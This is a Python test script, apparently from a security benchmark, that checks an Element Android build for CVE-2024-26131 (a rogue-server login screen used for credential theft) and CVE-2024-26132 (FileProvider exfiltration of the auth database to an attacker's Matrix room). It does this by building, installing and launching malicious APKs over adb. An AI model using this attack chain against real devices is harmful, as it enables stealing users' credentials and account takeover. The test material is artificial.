#!/usr/bin/env python3
"""
Confidentiality tests for Element Android app
Tests for credential theft via CVE-2024-26131 rogue server attack
"""

import json
import os
import subprocess
import sys
import time
from typing import Any, Dict, Tuple


def run_adb_command(command: str) -> Tuple[bool, str]:
    """Run ADB command and return (success, output) tuple"""
    try:
        result = subprocess.run(
            f"adb {command}", shell=True, capture_output=True, text=True, timeout=30
        )
        return result.returncode == 0, result.stdout.strip()
    except subprocess.TimeoutExpired:
        return False, "TIMEOUT"
    except Exception as e:
        return False, f"ERROR: {str(e)}"


def test_rogue_server_credential_theft() -> Dict[str, Any]:
    """
    Test CVE-2024-26131: Rogue server login for credential theft

    This test exploits Element's intent redirection vulnerability to force
    LoginActivity to display a login screen configured with an attacker-controlled
    Matrix server, enabling credential harvesting and account takeover attacks.
    """
    test_name = "rogue_server_credential_theft_cve_2024_26131"

    element_pkg = "im.vector.app.debug"
    attacker_pkg = "com.example.elementexploit"
    attacker_activity = "com.example.elementexploit.MainActivity"

    # Rogue server URL (for emulator, use 10.0.2.2 to reach host machine)
    rogue_server_url = "http://10.0.2.2:8000"

    # Check if Element is installed
    success, output = run_adb_command("shell pm list packages | grep im.vector.app")
    if not success or "im.vector.app" not in output:
        return {
            "test": test_name,
            "success": False,
            "score": 1,
            "message": "Element not installed - cannot test rogue server attack"
        }

    # Use the malicious app from vuln_scenario_0
    vuln_scenario_dir = os.path.join(
        os.path.dirname(__file__),
        "vuln_scenarios",
        "vuln_scenario_0"
    )
    malicious_apk_path = os.path.join(
        vuln_scenario_dir,
        "malicious_app",
        "dist",
        "element-exploit.apk"
    )
    build_script = os.path.join(vuln_scenario_dir, "malicious_app", "build.sh")

    if not os.path.exists(build_script):
        return {
            "test": test_name,
            "success": False,
            "score": 1,
            "message": "Malicious app build script not found"
        }

    # Build the exploit APK
    try:
        result = subprocess.run(
            f"cd '{os.path.dirname(build_script)}' && ./build.sh",
            shell=True,
            capture_output=True,
            text=True,
            timeout=120
        )
        if result.returncode != 0 or not os.path.exists(malicious_apk_path):
            return {
                "test": test_name,
                "success": False,
                "score": 1,
                "message": "Failed to build malicious APK"
            }
    except Exception as e:
        return {
            "test": test_name,
            "success": False,
            "score": 1,
            "message": f"Build error: {str(e)}"
        }

    # Uninstall any existing malicious app
    run_adb_command(f"uninstall {attacker_pkg}")

    # Install the malicious APK
    success, output = run_adb_command(f"install '{malicious_apk_path}'")
    if not success:
        return {
            "test": test_name,
            "success": False,
            "score": 1,
            "message": "Failed to install malicious APK"
        }

    # Clear logcat to capture exploit activity
    run_adb_command("logcat -c")

    # Launch the exploit with rogue server mode
    success, output = run_adb_command(
        f"shell am start -n {attacker_pkg}/{attacker_activity} "
        f"--es exploit_type rogue_server "
        f"--es rogue_server_url '{rogue_server_url}'"
    )
    if not success:
        # Clean up
        run_adb_command(f"uninstall {attacker_pkg}")
        return {
            "test": test_name,
            "success": False,
            "score": 1,
            "message": "Failed to launch exploit app"
        }

    # Wait for exploit to execute
    time.sleep(4)

    # Check if Element was launched
    success, element_pid = run_adb_command(f"shell pidof {element_pkg}")

    # Check for LoginActivity in activity stack
    success, activity_output = run_adb_command(
        "shell dumpsys activity activities | grep -A 15 LoginActivity"
    )

    # Check logcat for exploit evidence
    success, logcat_output = run_adb_command("logcat -d -s ElementExploit:D")
    exploit_logged = "ROGUE SERVER LOGIN" in logcat_output if logcat_output else False

    # Check for rogue server URL evidence in logs
    success, rogue_url_check = run_adb_command(
        "logcat -d | grep -i '10.0.2.2:8000\\|rogue.*server'"
    )

    # Check for LoginConfig evidence
    success, login_config_check = run_adb_command(
        "shell dumpsys activity activities | grep -i 'LoginConfig\\|EXTRA_CONFIG'"
    )

    # Clean up malicious app
    run_adb_command(f"uninstall {attacker_pkg}")

    # Determine if exploit succeeded
    login_active = activity_output and "LoginActivity" in activity_output
    rogue_evidence = rogue_url_check and ("10.0.2.2" in rogue_url_check or "rogue" in rogue_url_check.lower())

    if login_active and rogue_evidence:
        return {
            "test": test_name,
            "success": True,
            "score": 0,
            "message": f"CVE-2024-26131 rogue server VULNERABLE - LoginActivity launched with rogue server config (credential theft attack possible - user credentials would be sent to {rogue_server_url})"
        }
    elif login_active:
        return {
            "test": test_name,
            "success": True,
            "score": 0,
            "message": "CVE-2024-26131 rogue server VULNERABLE - LoginActivity accessible via intent redirection (credential theft possible)"
        }
    elif exploit_logged:
        return {
            "test": test_name,
            "success": True,
            "score": 0.5,
            "message": "Rogue server exploit executed but login activity unclear"
        }

    return {
        "test": test_name,
        "success": True,
        "score": 1,
        "message": "Rogue server credential theft exploit did not succeed - vulnerability appears patched"
    }


def test_file_exfiltration_cve_2024_26132() -> Dict[str, Any]:
    """
    Test CVE-2024-26132: File exfiltration via IncomingShareActivity + FileProvider

    This test exploits Element's FileProvider misconfiguration where the
    MultiPickerFileProvider exposes /data/data/im.vector.app/files/, allowing
    external apps to exfiltrate sensitive files (auth tokens, encryption keys)
    by sending them to attacker-controlled Matrix rooms via IncomingShareActivity.

    REAL ATTACK DEMONSTRATION:
    1. Creates an "attacker" Matrix account (Bob)
    2. Bob creates a private room (attacker-controlled exfiltration room)
    3. Malicious app exfiltrates Alice's private files to Bob's room
    4. Bob receives Alice's sensitive data WITHOUT Alice's knowledge or consent
    """
    test_name = "file_exfiltration_cve_2024_26132"

    element_pkg = "im.vector.app.debug"
    attacker_pkg = "com.example.elementexfiltrate"
    attacker_activity = "com.example.elementexfiltrate.MainActivity"

    # Target file to exfiltrate (sensitive auth database)
    target_file = "matrix-sdk-auth.realm"

    # STEP 1: Create attacker-controlled room using Bob's account
    # This simulates the attacker setting up their exfiltration infrastructure
    import os as os_module

    import requests

    # Try to create attacker room via Matrix API
    # Get Bob's access token (attacker account)
    bob_token = None
    try:
        response = requests.post(
            "http://localhost:8008/_matrix/client/v3/login",
            json={
                "type": "m.login.password",
                "user": "bob",
                "password": "bobpass123"
            },
            timeout=10
        )
        if response.status_code == 200:
            bob_token = response.json().get("access_token")
    except Exception:
        pass

    room_id = ""
    # Matrix user ID format is @username:homeserver (port is not included in user IDs)
    alice_user_id = "@alice:localhost"

    # Create a private "exfiltration room" as Bob (the attacker)
    if bob_token:
        try:
            response = requests.post(
                "http://localhost:8008/_matrix/client/v3/createRoom",
                headers={"Authorization": f"Bearer {bob_token}"},
                json={
                    "name": "Exfiltrated Data Drop",
                    "preset": "private_chat",
                    "visibility": "private",
                    "topic": "CVE-2024-26132 File Exfiltration Test"
                },
                timeout=10
            )
            print(f"Room creation response: {response.status_code}")
            if response.status_code == 200:
                room_id = response.json().get("room_id")
                print(f"Created room: {room_id}")

                # STEP 2: Invite Alice to the room
                # This is key - the attacker creates a shared room with the victim
                # This could be disguised as a legitimate conversation
                if room_id:
                    try:
                        invite_response = requests.post(
                            f"http://localhost:8008/_matrix/client/v3/rooms/{room_id}/invite",
                            headers={"Authorization": f"Bearer {bob_token}"},
                            json={"user_id": alice_user_id},
                            timeout=10
                        )
                        print(f"Invite response: {invite_response.status_code}")
                        if invite_response.status_code == 200:
                            print(f"Invited {alice_user_id} to room {room_id}")
                            # Give Alice time to receive the invite
                            time.sleep(1)

                            # STEP 3: Accept invite as Alice (auto-join for testing)
                            # Get Alice's access token
                            alice_token = None
                            try:
                                alice_login = requests.post(
                                    "http://localhost:8008/_matrix/client/v3/login",
                                    json={
                                        "type": "m.login.password",
                                        "user": "alice",
                                        "password": "alicepass123"
                                    },
                                    timeout=10
                                )
                                print(f"Alice login response: {alice_login.status_code}")
                                if alice_login.status_code == 200:
                                    alice_token = alice_login.json().get("access_token")
                                    print(f"Got Alice token: {alice_token[:20] if alice_token else 'None'}...")

                                    # Alice joins the room
                                    if alice_token:
                                        join_response = requests.post(
                                            f"http://localhost:8008/_matrix/client/v3/rooms/{room_id}/join",
                                            headers={"Authorization": f"Bearer {alice_token}"},
                                            timeout=10
                                        )
                                        print(f"Alice join response: {join_response.status_code}")
                                        if join_response.status_code == 200:
                                            print(f"Alice successfully joined room {room_id}")
                                            # Send a test message from Alice to confirm room membership
                                            try:
                                                msg_response = requests.post(
                                                    f"http://localhost:8008/_matrix/client/v3/rooms/{room_id}/send/m.room.message",
                                                    headers={"Authorization": f"Bearer {alice_token}"},
                                                    json={
                                                        "msgtype": "m.text",
                                                        "body": "Alice joined the room - CVE-2024-26132 attack setup complete"
                                                    },
                                                    timeout=10
                                                )
                                                print(f"Alice message response: {msg_response.status_code}")
                                            except Exception as e:
                                                print(f"Failed to send Alice message: {e}")

                                            # Give Element time to sync the new room
                                            time.sleep(2)
                            except Exception:
                                pass
                    except Exception:
                        pass
        except Exception:
            pass

    # Fallback: Use environment variable or existing room
    if not room_id:
        room_id = os_module.environ.get('ROOM_ID', '')

    if not room_id:
        return {
            "test": test_name,
            "success": False,
            "score": 1,
            "message": "Could not create attacker room - Matrix server not available. Set ROOM_ID environment variable with existing room to test."
        }

    # Check if Element is installed
    success, output = run_adb_command("shell pm list packages | grep im.vector.app")
    if not success or "im.vector.app" not in output:
        return {
            "test": test_name,
            "success": False,
            "score": 1,
            "message": "Element not installed - cannot test file exfiltration"
        }

    # Use the malicious app from vuln_scenario_2
    vuln_scenario_dir = os.path.join(
        os.path.dirname(__file__),
        "vuln_scenarios",
        "vuln_scenario_2"
    )
    malicious_apk_path = os.path.join(
        vuln_scenario_dir,
        "malicious_app",
        "dist",
        "element-exfiltrate.apk"
    )
    build_script = os.path.join(vuln_scenario_dir, "malicious_app", "build.sh")

    if not os.path.exists(build_script):
        return {
            "test": test_name,
            "success": False,
            "score": 1,
            "message": "Malicious app build script not found"
        }

    # Build the exploit APK
    try:
        result = subprocess.run(
            f"cd '{os.path.dirname(build_script)}' && ./build.sh",
            shell=True,
            capture_output=True,
            text=True,
            timeout=120
        )
        if result.returncode != 0 or not os.path.exists(malicious_apk_path):
            return {
                "test": test_name,
                "success": False,
                "score": 1,
                "message": "Failed to build malicious APK"
            }
    except Exception as e:
        return {
            "test": test_name,
            "success": False,
            "score": 1,
            "message": f"Build error: {str(e)}"
        }

    # Uninstall any existing malicious app
    run_adb_command(f"uninstall {attacker_pkg}")

    # Install the malicious APK
    success, output = run_adb_command(f"install '{malicious_apk_path}'")
    if not success:
        return {
            "test": test_name,
            "success": False,
            "score": 1,
            "message": "Failed to install malicious APK"
        }

    # Clear logcat to capture exploit activity
    run_adb_command("logcat -c")

    # Launch the exploit
    success, output = run_adb_command(
        f"shell am start -n {attacker_pkg}/{attacker_activity} "
        f"--es target_file '{target_file}' "
        f"--es room_id '{room_id}'"
    )
    if not success:
        # Clean up
        run_adb_command(f"uninstall {attacker_pkg}")
        return {
            "test": test_name,
            "success": False,
            "score": 1,
            "message": "Failed to launch exploit app"
        }

    # Wait for exploit to execute and file to be sent
    time.sleep(5)

    # Check if Element was launched
    success, element_pid = run_adb_command(f"shell pidof {element_pkg}")

    # Check for IncomingShareActivity in activity stack
    success, activity_output = run_adb_command(
        "shell dumpsys activity activities | grep -A 15 IncomingShareActivity"
    )

    # Check logcat for exploit evidence
    success, logcat_output = run_adb_command("logcat -d -s ElementExfiltrate:D")
    exploit_logged = "FILE EXFILTRATION" in logcat_output if logcat_output else False

    # Check for FileProvider URI evidence in logs
    success, fileprovider_check = run_adb_command(
        "logcat -d | grep -i 'multipicker.fileprovider\\|external_files'"
    )

    # Check for target file being read/accessed
    success, file_check = run_adb_command(
        f"logcat -d | grep -i '{target_file}'"
    )

    # CRITICAL: Check if file was actually sent to the room (not just activity launched)
    # Look for evidence of file upload/send in Element logs
    success, file_send_evidence = run_adb_command(
        "logcat -d | grep -iE 'upload|sending.*file|IncomingShare.*send|attachment.*send'"
    )

    # Check for room ID in logs (indicates file was sent to specific room)
    success, room_evidence = run_adb_command(
        f"logcat -d | grep -i '{room_id}'"
    )

    # Check for successful file share completion
    success, share_complete = run_adb_command(
        "logcat -d | grep -iE 'share.*complete|file.*sent|upload.*success'"
    )

    # Clean up malicious app
    run_adb_command(f"uninstall {attacker_pkg}")

    # Determine if exploit succeeded
    share_active = activity_output and "IncomingShareActivity" in activity_output
    fileprovider_evidence = fileprovider_check and "multipicker.fileprovider" in fileprovider_check
    file_sent = file_send_evidence and any(keyword in file_send_evidence.lower() for keyword in ['upload', 'send', 'attachment'])
    room_targeted = room_evidence and room_id in room_evidence

    # Check if room selection UI is shown (indicates FileProvider worked but room ID invalid)
    success, room_list_check = run_adb_command(
        "shell dumpsys activity activities | grep -iE 'RoomList|ShareTo|ChooseRoom'"
    )
    room_selection_shown = room_list_check and any(keyword in room_list_check for keyword in ['RoomList', 'ShareTo', 'ChooseRoom'])

    # STEP 4: Verify if file was actually received in Bob's room (attacker confirmation)
    file_received_by_attacker = False
    if bob_token and room_id:
        try:
            # Check Bob's room for the exfiltrated file
            response = requests.get(
                f"http://localhost:8008/_matrix/client/v3/rooms/{room_id}/messages",
                headers={"Authorization": f"Bearer {bob_token}"},
                params={"limit": 10},
                timeout=10
            )
            if response.status_code == 200:
                messages = response.json().get("chunk", [])
                # Look for file message type
                for msg in messages:
                    if msg.get("type") == "m.room.message":
                        msgtype = msg.get("content", {}).get("msgtype")
                        body = msg.get("content", {}).get("body", "")
                        if msgtype == "m.file" or target_file in body:
                            file_received_by_attacker = True
                            break
        except Exception:
            pass

    # Strongest evidence: File was actually sent and received by attacker
    if file_received_by_attacker:
        return {
            "test": test_name,
            "success": True,
            "score": 0,
            "message": f"CVE-2024-26132 CRITICAL VULNERABILITY CONFIRMED - Complete attack chain demonstrated! (1) Attacker Bob created room '{room_id}', (2) Alice joined room, (3) Malicious app exfiltrated Alice's file '{target_file}' containing private credentials to Bob's room WITHOUT Alice's interaction, (4) Bob successfully received Alice's sensitive data. Real-world data exfiltration attack successful!"
        }
    # Strong evidence: File was sent (based on logs)
    elif share_active and file_sent and (fileprovider_evidence or room_targeted):
        return {
            "test": test_name,
            "success": True,
            "score": 0,
            "message": f"CVE-2024-26132 file exfiltration VULNERABLE - File '{target_file}' was automatically sent to attacker room '{room_id}' without user interaction. Check Element app to verify file was received. (IncomingShareActivity + FileProvider exploit confirmed)"
        }
    # Strong evidence: Room selection shown = FileProvider URI was successfully read
    elif share_active and (fileprovider_evidence or room_selection_shown):
        return {
            "test": test_name,
            "success": True,
            "score": 0,
            "message": f"CVE-2024-26132 file exfiltration VULNERABLE - External malicious app successfully accessed Element's private file '{target_file}' via FileProvider. File is being sent to room '{room_id}'. Check Element app to verify file delivery - vulnerability allows exfiltration to ANY Matrix room without user consent."
        }
    # Medium evidence: IncomingShareActivity launched
    elif share_active:
        return {
            "test": test_name,
            "success": True,
            "score": 0,
            "message": "CVE-2024-26132 file exfiltration VULNERABLE - IncomingShareActivity accessible to external apps, allowing file exfiltration to any room via EXTRA_SHORTCUT_ID"
        }
    elif exploit_logged:
        return {
            "test": test_name,
            "success": True,
            "score": 0.5,
            "message": "File exfiltration exploit executed but activity launch unclear"
        }

    return {
        "test": test_name,
        "success": True,
        "score": 1,
        "message": "File exfiltration exploit did not succeed - vulnerability appears patched"
    }


def main():
    """Run all confidentiality tests"""
    tests = [
        test_file_exfiltration_cve_2024_26132,
        test_rogue_server_credential_theft
    ]

    results = []
    total_score = 0

    for test_func in tests:
        result = test_func()
        results.append(result)
        total_score += result.get("score", 0)

    # Calculate final score - if ANY test fails (score < 1), final score is 0
    final_score = 0 if any(r.get("score", 1) < 1 for r in results) else 1

    # Format output to match expected structure
    output = {
        "score": final_score,
        "details": results,
        "summary": f"Confidentiality tests completed. Score: {final_score}"
    }

    print(json.dumps(output, indent=2))
    sys.exit(0)


if __name__ == "__main__":
    main()
